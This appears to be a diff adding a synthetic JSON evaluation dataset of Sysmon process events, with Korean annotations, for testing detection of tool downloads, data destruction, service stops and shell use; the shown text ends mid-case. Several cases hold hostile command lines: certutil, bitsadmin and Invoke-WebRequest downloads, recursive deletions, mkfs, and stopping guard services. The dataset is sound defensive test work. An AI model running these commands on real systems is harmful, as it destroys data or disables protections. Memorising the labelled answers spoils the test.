@@ -1,0 +1,2250 @@
+{
+  "schema_version": 1,
+  "dataset_id": "aegis-synthetic-v1",
+  "cases": [
+    {
+      "case_id": "dev-editor",
+      "group_id": "editor-benign",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "메모장 실행을 가정한 단일 무해 예제로, 외부 도구 반입·파괴·중지·명령 셸 사용을 포함하지 않습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "명령 규칙과 기준선 모두 탐지하지 않을 것으로 예상합니다.",
+      "technique_truth": {
+        "T1105": "negative",
+        "T1485": "negative",
+        "T1489": "negative",
+        "T1059": "negative"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\notepad.exe",
+            "CommandLine": "notepad.exe",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-curl-tool",
+      "group_id": "http-download-document",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "격리된 가상 시나리오에서 도구를 원격 위치에서 가져오려는 행위로 주석했습니다. 실제 다운로드 성공이나 악성 여부는 입증하지 않습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "curl 문자열에 T1105 규칙과 URL 기준선이 나올 수 있습니다.",
+      "technique_truth": {
+        "T1105": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 2,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\curl.exe",
+            "CommandLine": "curl https://example.org/tool.exe",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-curl-maint",
+      "group_id": "http-download-document",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "관리자 문서 확인으로 설정한 정상 시나리오입니다. 명령만으로 공격 여부나 파일 반입 성공은 판단하지 않습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "curl 규칙이 발생할 수 있어 정상 맥락 오탐 사례입니다.",
+      "technique_truth": {
+        "T1105": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 3,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\curl.exe",
+            "CommandLine": "curl https://example.org/status.txt",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-cert-download",
+      "group_id": "certutil-transfer",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "검증되지 않은 도구 다운로드를 시도한 합성 상황으로 주석했습니다. 성공 여부는 알 수 없습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "certutil에 대한 T1105 규칙이 예상됩니다.",
+      "technique_truth": {
+        "T1105": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 4,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\certutil.exe",
+            "CommandLine": "certutil -urlcache -split -f https://example.org/lab.bin C:\\lab\\lab.bin",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-cert-hash",
+      "group_id": "certutil-transfer",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "로컬 파일 해시 검증 예제로 원격 전달 동작을 포함하지 않습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "certutil 이름만으로 T1105가 발생하는 오탐이 예상됩니다.",
+      "technique_truth": {
+        "T1105": "negative"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 5,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\certutil.exe",
+            "CommandLine": "certutil -hashfile C:\\lab\\sample.bin SHA256",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-rm-delete",
+      "group_id": "rm-destruction",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "가상 증거 보관 경로의 재귀 삭제 시도로 설정했으며 파괴 행위 후보입니다. 실제 파괴 성공은 확인하지 않습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "재귀 삭제 규칙 T1485가 예상됩니다.",
+      "technique_truth": {
+        "T1485": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 6,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\rm.exe",
+            "CommandLine": "rm -rf /lab/staging",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-rm-single",
+      "group_id": "rm-destruction",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "테스트용 단일 임시 파일 정리로 설정했으며 파괴 행위로 주석하지 않았습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "재귀 삭제 규칙에 일치하지 않을 것으로 예상합니다.",
+      "technique_truth": {
+        "T1485": "negative"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 7,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\rm.exe",
+            "CommandLine": "rm -f /lab/temporary.txt",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-sc-stop",
+      "group_id": "service-stop-vs-query",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "보호용 가상 서비스를 중지하려는 예제로 서비스 중단 후보를 지정했습니다. 실제 중단은 확인하지 않습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "sc stop 문자열에 T1489 규칙이 예상됩니다.",
+      "technique_truth": {
+        "T1489": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 8,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\sc.exe",
+            "CommandLine": "sc stop DemoGuard",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-sc-query",
+      "group_id": "service-stop-vs-query",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "서비스 상태를 조회하는 예제로 중지 명령이 아닙니다.",
+      "context": "benign",
+      "expected_engine_behavior": "서비스 중지 규칙이 발생하지 않을 것으로 예상합니다.",
+      "technique_truth": {
+        "T1489": "negative"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 9,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\sc.exe",
+            "CommandLine": "sc query DemoGuard",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-cmd-whoami",
+      "group_id": "cmd-shell",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "테스트 계정 확인을 위한 명령 해석기 실행이며 정상 관리 활동으로 설정했습니다. T1059 후보는 셸 실행 관찰을 뜻합니다.",
+      "context": "benign",
+      "expected_engine_behavior": "cmd.exe 기준선 T1059가 나타날 수 있습니다.",
+      "technique_truth": {
+        "T1059": "positive",
+        "T1485": "negative"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 10,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-format-unknown",
+      "group_id": "format-ambiguous",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "unknown",
+      "truth_reason": "도구 도움말만 확인되어 파괴 의도나 실제 포맷을 판단할 수 없습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "format 문자열에 파괴 규칙이 나올 수 있어 과탐 가능성을 점검합니다.",
+      "technique_truth": {
+        "T1485": "unknown",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 11,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\cmd.exe",
+            "CommandLine": "format /?",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-powershell-unknown",
+      "group_id": "ps-ambiguous",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "unknown",
+      "truth_reason": "명령 해석기가 시작됐지만 수행 명령이 없어 의도를 판단할 수 없습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "powershell 기준선 T1059가 예상됩니다.",
+      "technique_truth": {
+        "T1059": "positive",
+        "T1105": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 12,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\powershell.exe",
+            "CommandLine": "powershell.exe -NoProfile",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "dev-empty-command",
+      "group_id": "missing-command",
+      "split": "dev",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "unknown",
+      "truth_reason": "실제 명령줄이 수집되지 않아 행위와 의도를 판단할 수 없습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "빈 명령줄을 처리하되 의미 분류나 명령 규칙은 내지 않을 것으로 예상합니다.",
+      "technique_truth": {
+        "T1059": "positive",
+        "T1105": "unknown",
+        "T1485": "unknown",
+        "T1489": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 13,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\powershell.exe",
+            "CommandLine": "",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-wget-tool",
+      "group_id": "http-download-document",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "가상 조사 상황에서 외부 도구를 가져오려는 명령으로 주석했습니다. 전송 성공이나 악성 여부는 미확인입니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "wget 문자열에 T1105 규칙이 예상됩니다.",
+      "technique_truth": {
+        "T1105": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 14,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\wget.exe",
+            "CommandLine": "wget https://example.org/lab-tool.bin -O C:\\lab\\tool.bin",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-wget-info",
+      "group_id": "http-download-document",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "허가된 문서 조회로 가정한 시나리오입니다. 도구 반입 여부는 이 문자열만으로 판단하기 어렵습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "wget 이름만으로 탐지될 수 있는 정상 맥락 사례입니다.",
+      "technique_truth": {
+        "T1105": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 15,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\wget.exe",
+            "CommandLine": "wget https://example.org/readme.txt",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-iwr",
+      "group_id": "iwr-transfer",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "가상의 의심 도구 저장 시도와 셸 실행을 함께 주석했습니다. 실제 전송 결과는 알 수 없습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "Invoke-WebRequest 규칙 및 powershell 기준선이 예상됩니다.",
+      "technique_truth": {
+        "T1105": "positive",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 16,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\powershell.exe",
+            "CommandLine": "powershell.exe -Command Invoke-WebRequest https://example.org/agent.bin -OutFile C:\\lab\\agent.bin",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-bitsadmin",
+      "group_id": "bits-transfer",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "BITS 도구의 가상 원격 파일 저장 시도로, 도구 이전 후보에 주석했습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "명시 규칙은 없고 transfer·URL 기준선이 나올 수 있습니다.",
+      "technique_truth": {
+        "T1105": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 17,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\bitsadmin.exe",
+            "CommandLine": "bitsadmin /transfer demo https://example.org/a.bin C:\\lab\\a.bin",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-del-recursive",
+      "group_id": "del-destruction",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "가상 보관 폴더 파일의 재귀 삭제 시도 및 명령 해석기 실행을 주석했습니다. 실제 삭제는 확인하지 않습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "del /s 또는 /q 규칙과 cmd 기준선이 예상됩니다.",
+      "technique_truth": {
+        "T1485": "positive",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 18,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\cmd.exe",
+            "CommandLine": "cmd.exe /c del /s /q C:\\lab\\staging\\*",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-del-one",
+      "group_id": "del-destruction",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "사용자 확인을 받는 단일 임시 파일 정리로 설정했습니다. 셸 실행과 파괴적 행위를 구별합니다.",
+      "context": "benign",
+      "expected_engine_behavior": "cmd.exe 기준선은 가능하나 재귀 삭제 규칙은 예상하지 않습니다.",
+      "technique_truth": {
+        "T1485": "negative",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 19,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\cmd.exe",
+            "CommandLine": "cmd.exe /c del /p C:\\lab\\temporary.txt",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-rmdir",
+      "group_id": "rmdir-destruction",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "가상의 증거 폴더를 재귀 제거하려는 시나리오로 파괴 후보를 지정했습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "현행 rmdir 전용 규칙이 없어 T1485를 놓칠 수 있습니다.",
+      "technique_truth": {
+        "T1485": "positive",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 20,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\cmd.exe",
+            "CommandLine": "cmd.exe /c rmdir /s /q C:\\lab\\evidence",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-mkfs",
+      "group_id": "mkfs-destruction",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "가상의 조사 디스크에 새 파일시스템을 생성하려는 행위로 파괴 후보를 부여했습니다. 실제 장치는 접근하지 않습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "mkfs 경계 규칙으로 T1485가 예상됩니다.",
+      "technique_truth": {
+        "T1485": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 21,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\mkfs.ext4",
+            "CommandLine": "mkfs.ext4 /dev/labdisk",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-stop-service",
+      "group_id": "service-stop-vs-query",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "보호용 가상 서비스를 중지하는 셸 명령으로 서비스 중단 후보를 주석했습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "Stop-Service 규칙과 powershell 기준선이 예상됩니다.",
+      "technique_truth": {
+        "T1489": "positive",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 22,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\powershell.exe",
+            "CommandLine": "powershell.exe -Command Stop-Service DemoMonitor",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-service-get",
+      "group_id": "service-stop-vs-query",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "서비스 상태 조회를 수행하는 정상 관리 예제로 셸 실행은 있으나 서비스 중지는 아닙니다.",
+      "context": "benign",
+      "expected_engine_behavior": "powershell 기준선이 나오더라도 서비스 중지 T1489는 예상하지 않습니다.",
+      "technique_truth": {
+        "T1489": "negative",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 23,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\powershell.exe",
+            "CommandLine": "powershell.exe -Command Get-Service DemoMonitor",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-rundll-unknown",
+      "group_id": "rundll-ambiguous",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "unknown",
+      "truth_reason": "라이브러리 내용과 실행 결과가 없어 정상 여부 및 관련 기법을 판단할 수 없습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "현재 명시 규칙으로는 탐지가 없을 수 있습니다.",
+      "technique_truth": {
+        "T1059": "unknown",
+        "T1485": "unknown"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 24,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\rundll32.exe",
+            "CommandLine": "rundll32.exe C:\\lab\\library.dll,Entry",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-calc",
+      "group_id": "calculator-benign",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "negative",
+      "truth_reason": "계산기 단독 실행으로 정의한 정상 예제입니다.",
+      "context": "benign",
+      "expected_engine_behavior": "명령 규칙과 기준선의 탐지가 없을 것으로 예상합니다.",
+      "technique_truth": {
+        "T1105": "negative",
+        "T1485": "negative",
+        "T1489": "negative",
+        "T1059": "negative"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 25,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\calc.exe",
+            "CommandLine": "calc.exe",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
